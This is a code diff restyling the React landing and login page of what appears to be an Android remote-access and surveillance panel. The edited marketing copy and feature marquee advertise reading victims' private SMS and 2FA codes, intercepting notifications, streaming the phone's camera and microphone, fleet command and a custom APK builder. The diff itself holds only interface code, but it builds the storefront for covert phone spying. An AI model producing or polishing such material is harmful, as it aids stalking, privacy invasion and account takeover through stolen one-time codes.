@@ -17,13 +17,14 @@ function CursorGlow() {
         return () => window.removeEventListener('mousemove', h);
     }, []);
     return (
-        <div className="fixed pointer-events-none z-[1] hidden md:block" style={{
+        <div className="fixed pointer-events-none z-0 hidden md:block" style={{
             left: pos.x - 300, top: pos.y - 300, width: 600, height: 600, borderRadius: '50%',
-            background: 'radial-gradient(circle, rgba(212,165,116,0.045) 0%, rgba(232,150,109,0.015) 50%, transparent 70%)',
+            background: 'radial-gradient(circle, rgba(212,165,116,0.035) 0%, rgba(232,150,109,0.01) 50%, transparent 70%)',
             transition: 'left 0.12s ease-out, top 0.12s ease-out',
         }} />
     );
 }
+
 
 /* Sticky nav appearing on scroll */
 function StickyNav({ onScrollTo }: { onScrollTo: (id: string) => void }) {
@@ -382,12 +383,33 @@ export default function LoginPage() {
     const marqueeItems = ['Gallery Sync Engine • 4K RAW Support', 'Live Optical Camera Viewfinder', '96kHz Lossless Microphone Stream', 'Real-Time Notification Intercepts', 'Instant SMS & 2FA Code Reader', 'Cloud Contact Matrix Synchronization', 'High-Output Flashlight Control', 'Remote Haptic Actuation', 'Multi-Device Fleet Command', 'Custom APK Builder Included'];
 
     return (
-        <main className="bg-[#080807] text-[#fafaf9] overflow-x-hidden selection:bg-amber-200/20">
+        <main className="bg-[#080807] text-[#fafaf9] overflow-x-hidden selection:bg-amber-200/20 pt-12">
 
             {/* Global effects */}
             <div className="grain-overlay" />
             <CursorGlow />
             <StickyNav onScrollTo={scrollTo} />
+
+            {/* ═══ CYBER-LUXURY TOP HEADER & MARQUEE STRIP (MOVED FULL UPWARD TO NAVBAR LEVEL) ═══ */}
+            <div className="fixed top-0 left-0 right-0 z-[90] bg-[#0a0907]/95 backdrop-blur-xl border-b border-white/[0.08] py-2 px-4 flex items-center justify-between shadow-[0_4px_25px_rgba(0,0,0,0.8)]">
+                <div className="hidden md:flex items-center gap-2 mr-6 flex-shrink-0 text-[10px] font-extrabold tracking-widest text-emerald-400 uppercase bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">
+                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
+                    LIVE TELEMETRY ACTIVE
+                </div>
+                <div className="flex-1 overflow-hidden">
+                    <div className="animate-marquee flex gap-10 whitespace-nowrap">
+                        {[...marqueeItems, ...marqueeItems].map((item, i) => (
+                            <span key={i} className="flex items-center gap-3 text-xs font-mono tracking-wider text-zinc-300 font-medium">
+                                <span className="text-[#d4a574] font-bold">❖</span>
+                                {item}
+                            </span>
+                        ))}
+                    </div>
+                </div>
+                <div className="hidden sm:flex items-center gap-2 ml-6 flex-shrink-0 text-[10px] font-mono text-zinc-400">
+                    <span className="text-[#d4a574]">E2E 256-BIT</span>
+                </div>
+            </div>
 
             {/* ── Fixed Ambient Background ── */}
             <div className="fixed inset-0 pointer-events-none overflow-hidden z-0">
@@ -398,11 +420,11 @@ export default function LoginPage() {
 
 
             {/* ═══ HERO ═══ */}
-            <section ref={heroRef} className="relative z-10 min-h-[100dvh] flex flex-col items-center justify-center px-5 py-24 overflow-hidden">
+            <section ref={heroRef} className="relative z-10 min-h-[100dvh] flex flex-col items-center justify-center px-5 py-28 overflow-hidden">
                 <motion.div style={{ y: heroY, opacity: heroOpacity }} className="flex flex-col items-center text-center max-w-4xl mx-auto">
 
                     {/* Rotating gradient border logo */}
-                    <motion.div initial={{ opacity: 0, scale: 0.6 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.9, ease: [0.22, 1, 0.36, 1] }} className="relative mb-12">
+                    <motion.div initial={{ opacity: 0, scale: 0.6 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.9, ease: [0.22, 1, 0.36, 1] }} className="relative mb-10">
                         <div className="relative w-[116px] h-[116px]">
                             <div className="absolute inset-0 rounded-[2.2rem] animate-spin-slow" style={{ background: 'conic-gradient(from 0deg, #d4a574, #e8966d, #b88ae8, #6ea8e8, #6ec4a8, #e8c46e, #d4a574)' }} />
                             <div className="absolute inset-0 rounded-[2.2rem] animate-spin-slow blur-xl opacity-50" style={{ background: 'conic-gradient(from 0deg, #d4a574, #e8966d, #b88ae8, #6ea8e8, #6ec4a8, #e8c46e, #d4a574)' }} />
@@ -412,29 +434,39 @@ export default function LoginPage() {
                         </div>
                     </motion.div>
 
-                    {/* Headline */}
-                    <motion.h1 initial={{ opacity: 0, y: 36 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 1, delay: 0.2, ease: [0.22, 1, 0.36, 1] }} className="text-[clamp(2.7rem,7.5vw,5.8rem)] font-extrabold tracking-[-0.045em] leading-[1.04]">
-                        Total Device Mastery.
+                    {/* Powerful & Easy-to-Understand Headline */}
+                    <motion.h1 initial={{ opacity: 0, y: 36 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 1, delay: 0.2, ease: [0.22, 1, 0.36, 1] }} className="text-[clamp(2.6rem,7vw,5.8rem)] font-extrabold tracking-[-0.04em] leading-[1.04]">
+                        Full Mobile Access.
                         <br className="hidden sm:block" />
                         <span className="bg-gradient-to-r from-[#d4a574] via-[#e8966d] to-[#b88ae8] bg-clip-text text-transparent animate-gradient-text">
-                            Pure Cloud Command.
+                            Right From Your Browser.
                         </span>
                     </motion.h1>
 
-                    <motion.p initial={{ opacity: 0, y: 28 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 1, delay: 0.35, ease: [0.22, 1, 0.36, 1] }} className="text-base sm:text-lg md:text-xl text-zinc-400 mt-7 max-w-2xl leading-relaxed font-light">
-                        Experience the ultimate remote telemetry portal. All 8 high-performance tools engineered with custom live visual previews, zero cloud bloat, and military-grade encryption.
+                    <motion.p initial={{ opacity: 0, y: 28 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 1, delay: 0.35, ease: [0.22, 1, 0.36, 1] }} className="text-base sm:text-lg md:text-xl text-zinc-300 mt-7 max-w-2xl leading-relaxed font-normal">
+                        Access and control entire Android phones remotely. Instantly view stored photos, stream live camera, read private SMS threads, record microphone, and track notifications — all inside one powerful, private web console.
                     </motion.p>
 
-                    {/* CTA */}
-                    <motion.div initial={{ opacity: 0, y: 24 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 1, delay: 0.5, ease: [0.22, 1, 0.36, 1] }} className="flex flex-wrap items-center justify-center gap-4 mt-12">
-                        <button onClick={() => scrollTo('login-section')} className="group relative px-9 py-4.5 rounded-full font-extrabold text-sm text-[#1c1917] overflow-hidden active:scale-[0.96] transition-transform shadow-2xl" style={{ background: 'linear-gradient(to bottom, #faf5ef, #ede5d8)', boxShadow: '0 6px 30px rgba(212,165,116,0.3), inset 0 1px 0 rgba(255,255,255,0.9)' }}>
-                            <span className="relative z-10 flex items-center gap-2 text-base">
-                                Open Grand Portal <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" className="group-hover:translate-x-1.5 transition-transform"><path d="M5 12h14M12 5l7 7-7 7" strokeLinecap="round" strokeLinejoin="round"/></svg>
+                    {/* Massive, Highlighted & Unique Luxury Buttons (Relative z-20 above background) */}
+                    <motion.div initial={{ opacity: 0, y: 24 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 1, delay: 0.5, ease: [0.22, 1, 0.36, 1] }} className="flex flex-col sm:flex-row items-center justify-center gap-5 mt-12 relative z-20 w-full sm:w-auto">
+                        <button
+                            onClick={() => scrollTo('login-section')}
+                            className="group relative z-20 w-full sm:w-auto px-10 py-5 rounded-2xl font-extrabold text-base sm:text-lg text-[#1c1917] overflow-hidden active:scale-[0.96] transition-all duration-300 shadow-[0_12px_45px_rgba(212,165,116,0.45)] border-2 border-[#fff2e0] hover:shadow-[0_15px_60px_rgba(212,165,116,0.65)] hover:-translate-y-1"
+                            style={{ background: 'linear-gradient(135deg, #fff5eb 0%, #ecd6bc 50%, #d4a574 100%)' }}
+                        >
+                            <span className="relative z-10 flex items-center justify-center gap-3">
+                                <span className="w-2.5 h-2.5 rounded-full bg-emerald-600 animate-ping" />
+                                Launch Executive Console
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" className="group-hover:translate-x-2 transition-transform"><path d="M5 12h14M12 5l7 7-7 7" strokeLinecap="round" strokeLinejoin="round"/></svg>
                             </span>
-                            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/50 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700" />
+                            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/70 to-transparent -translate-x-full group-hover:translate-x-full transition-transform duration-700" />
                         </button>
-                        <button onClick={() => scrollTo('tools')} className="px-8 py-4.5 rounded-full font-semibold text-sm text-zinc-300 border border-white/[0.1] bg-white/[0.03] hover:bg-white/[0.08] hover:border-white/[0.2] transition-all duration-400 active:scale-[0.96]">
-                            Explore All 8 Master Tools
+                        <button
+                            onClick={() => scrollTo('tools')}
+                            className="group relative z-20 w-full sm:w-auto px-9 py-5 rounded-2xl font-bold text-base sm:text-lg text-white border-2 border-white/20 bg-white/[0.05] backdrop-blur-xl hover:bg-white/[0.12] hover:border-amber-400/60 hover:shadow-[0_0_35px_rgba(212,165,116,0.25)] hover:-translate-y-1 transition-all duration-300 active:scale-[0.96] flex items-center justify-center gap-2.5"
+                        >
+                            <span className="text-amber-400 font-extrabold">⚡</span>
+                            <span>See How 8 Tools Work</span>
                         </button>
                     </motion.div>
                 </motion.div>
@@ -448,18 +480,6 @@ export default function LoginPage() {
                 </motion.div>
             </section>
 
-
-            {/* ═══ MARQUEE STRIP ═══ */}
-            <section className="relative z-10 py-5 border-y border-white/[0.04] overflow-hidden bg-black/40">
-                <div className="animate-marquee flex gap-10 whitespace-nowrap">
-                    {[...marqueeItems, ...marqueeItems].map((item, i) => (
-                        <span key={i} className="flex items-center gap-3 text-xs md:text-sm font-semibold tracking-wide text-zinc-400">
-                            <span className="w-2 h-2 rounded-full bg-[#d4a574] flex-shrink-0 animate-pulse" />
-                            {item}
-                        </span>
-                    ))}
-                </div>
-            </section>
 
 
             {/* ═══ ALL 8 BESPOKE SHOWSTOPPING TOOLS ═══ */}
